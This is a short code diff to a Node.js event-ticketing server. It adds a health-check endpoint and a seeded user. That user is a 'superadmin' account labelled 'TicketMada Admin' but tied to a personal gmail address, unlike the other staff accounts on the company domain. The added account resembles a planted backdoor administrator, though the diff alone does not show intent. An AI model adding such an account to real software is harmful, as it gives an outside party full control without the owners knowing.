@@ -402,6 +402,7 @@ function seedDB() {
         [12, 'Solo Andria', 'solo@donia.mg', hash, 'organizer', null, 'SA', null, 'active', '2024-04-01'],
         [13, 'Admin TM', 'admin@ticketmada.mg', hash, 'admin', null, 'AT', null, 'active', '2023-01-01'],
         [14, 'Super Admin', 'superadmin@ticketmada.mg', hash, 'superadmin', null, 'SA', null, 'active', '2023-01-01'],
+        [15, 'TicketMada Admin', 'sedrayiokoraz@gmail.com', hash, 'superadmin', null, 'TM', null, 'active', '2024-01-01'],
     ];
     const insertMany = db.transaction((items) => { for (const u of items) insertUser.run(...u); });
     insertMany(users);
@@ -1470,6 +1471,7 @@ const server = http.createServer(async (req, res) => {
                 case 'team': return await handleTeam(req, res, parts);
                 case 'analytics': return await handleAnalytics(req, res, parts);
                 case 'activity': return await handleActivity(req, res, parts);
+                case 'health': return sendJSON(res, { status: 'ok', time: new Date().toISOString() });
                 case 'organizer-applications':
                 case 'my-application': return await handleOrganizerApplications(req, res, parts);
                 case 'superadmin': return await handleSuperAdmin(req, res, parts);
